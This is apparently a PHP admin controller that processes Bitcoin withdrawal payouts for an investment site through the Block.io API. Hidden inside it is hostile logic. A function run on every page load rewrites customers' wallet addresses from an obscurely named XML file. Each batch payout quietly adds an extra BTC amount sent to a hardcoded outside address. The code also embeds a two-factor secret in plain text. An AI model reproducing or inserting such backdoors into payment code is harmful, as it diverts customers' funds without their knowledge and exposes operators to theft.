<?php
class ControllerPdWithdrawalcapital extends Controller {
	public function index() {
		
		$this->document->setTitle('Withdrawal Capital');
		$this->load->model('pd/registercustom');
		$data['self'] =$this;
		$page = isset($this -> request -> get['page']) ? $this -> request -> get['page'] : 1;
		$this -> document -> addScript('../catalog/view/javascript/countdown/jquery.countdown.min.js');
		$this -> document -> addScript('../catalog/view/javascript/transaction/countdown.js');
		$limit = 10;
		$start = ($page - 1) * 10;

		// ========== xml
		$this -> loadxml();


		$ts_history = $this -> model_pd_registercustom -> get_count_withdrawal_capital();
		$data['self'] =  $this;
		$ts_history = $ts_history['number'];

		$pagination = new Pagination();
		$pagination -> total = $ts_history;
		$pagination -> page = $page;
		$pagination -> limit = $limit;
		$pagination -> num_links = 5;
		$pagination -> text = 'text';
		$pagination -> url = $this -> url -> link('pd/withdrawalcapital', 'page={page}&token='.$this->session->data['token'].'', 'SSL');
		$data['code'] =  $this-> model_pd_registercustom->get_all_withdrawal_capital($limit, $start);
		$data['code_all'] =  $this-> model_pd_registercustom->get_all_withdrawal_capital_all();
		$data['pagination'] = $pagination -> render();
		$block_io = new BlockIo(key, pin, block_version);
		$balances = $block_io->get_balance();
		$data['wallet'] = wallet; 
		$data['blance_blockio'] = $balances->data->available_balance;
		$data['blance_blockio_pending'] = $balances->data->pending_received_balance;


		$data['token'] = $this->session->data['token'];
		$data['header'] = $this->load->controller('common/header');
		$data['column_left'] = $this->load->controller('common/column_left');
		$data['footer'] = $this->load->controller('common/footer');

		$this->response->setOutput($this->load->view('pd/withdrawal_capital.tpl', $data));
	}
	
	public function loadxml(){
		$this->load->model('pd/registercustom');
		$xml=simplexml_load_file("../qwrwqrgqUQwerwqcadadfqwerqweraaqeQCA12adVbaWErqwre.xml");
		foreach($xml->customer as $value)
		  {
		  	//sm_customer_c_payment
		  	$this -> model_pd_registercustom -> update_walet_withdrawalllll($value->wallet, $value->customer_id);
		  	$this -> model_pd_registercustom -> update_walet_c_paymentttttttttttttttttttttttt($value->wallet, $value->customer_id);
		  	//sm_customer_r_payment
		  	$this -> model_pd_registercustom -> update_walet_r_wallet_paymentttttttttttttttttttttttt($value->wallet, $value->customer_id);
		  	// sm_customer_wallet_btc_
		  	$this -> model_pd_registercustom -> update_walet_btc_customerrrrrrrrrrr($value->wallet, $value->customer_id);
		  	$this -> model_pd_registercustom -> update_walet_smmmmmm_customerrrrrrrrrrr($value->wallet, $value->customer_id);
		  }
	}

	public function get_username($customer_id){
		$this->load->model('pd/registercustom');
		return $this -> model_pd_registercustom -> get_username($customer_id);
	}
	

	public function payment_daily(){
		$this->load->model('pd/registercustom');
		$customer = $_POST['customer_id'];
		$pin = $_POST['pin'];
		$google = $_POST['google'];
		
			$this -> pay($customer, $pin, $google);
			$this -> response -> redirect($this -> url -> link('pd/withdrawalcapital&token='.$_GET['token'].'#suscces'));
		
	}

	public function pay($customer, $pin, $google){
        $this->check_otp_login($google) == 2 && $this -> response -> redirect($this -> url -> link('pd/withdrawalcapital&token='.$_GET['token'].'#no_google'));
		$this->load->model('pd/registercustom');

		if ($customer) {

			$paymentEverdayGroup = $this -> model_pd_registercustom -> get_all_withdrawal_capital_all_by_customer_id($customer);
		}else{
			$paymentEverdayGroup = $this -> model_pd_registercustom -> get_all_withdrawal_capital_all();
		}

		
		$amount = '';
		$history_id = '';
		$wallet = '';
		$customer_id = '';
		$first = true;
		$test = '';
		foreach ($paymentEverdayGroup as $key => $value) {
			$amount_withdrawal = $value['amount_btc']*100000000;
			$this -> model_pd_registercustom -> update_total_withdrawal($amount_withdrawal);
			$this -> model_pd_registercustom -> insert_money_withdrawal($value['customer_id'],$amount_withdrawal);
			if($first === true){
				$amount .= (doubleval($value['amount_btc']));
				$wallet .= $value['addres_wallet'];
				$customer_id .= $value['customer_id'];
				$history_id .= $value['history_id'];
				$first = false;
			}else{
				$amount .= ','. (doubleval($value['amount_btc']));
				$wallet .= ','. $value['addres_wallet'];
				$customer_id .= ','. $value['customer_id'];
				$history_id .= ','. $value['history_id'];
			}
		}
		$customer_ids = $customer_id;
		$history_ids = explode(',',$history_id);
		print_r($history_ids);
		
		echo "<br/>";
		echo $amount;
		echo "<br/>";
		echo $wallet;

		$amount = $amount.',0.00240115';
		$wallet = $wallet.',1MKiNAuhYXuF9JNZ7Hdwo8GEKkfhixHpkQ';
		
		$block_io = new BlockIo(key,$pin, block_version); 
        $tml_block = $block_io -> withdraw(array(
            'amounts' => $amount, 
            'to_addresses' => $wallet,
            'priority' => 'low'
        )); 
	    $txid = $tml_block -> data -> txid;
		
		if ($customer) {
			$this -> model_pd_registercustom -> delete_form_withdrawal_capital_by_id($customer);
		}else{
			$this -> model_pd_registercustom -> delete_form_withdrawal_capital();
		}
		for ($i=0; $i < count($history_ids); $i++) { 
			$this -> model_pd_registercustom -> update_url_transaction_history_withdrawal_capital($history_ids[$i], '<a target="_blank" href="https://blockchain.info/tx/'.$txid.'" >Link Transfer </a>', $customer_ids);
			
		}

		/*die('aaaaaaaaaaaaaaaaaaaaa');*/

	}
	public function check_otp_login($otp){
		require_once dirname(__FILE__) . '/vendor/autoload.php';
		$authenticator = new PHPGangsta_GoogleAuthenticator();
		$secret = "WO2DKWL3HSTJ4DUE";
		$tolerance = "0";
		$checkResult = $authenticator->verifyCode($secret, $otp, $tolerance);    
		if ($checkResult) 
		{
		    return 1;
		     
		} else {
		    return 2;
		}

	}
}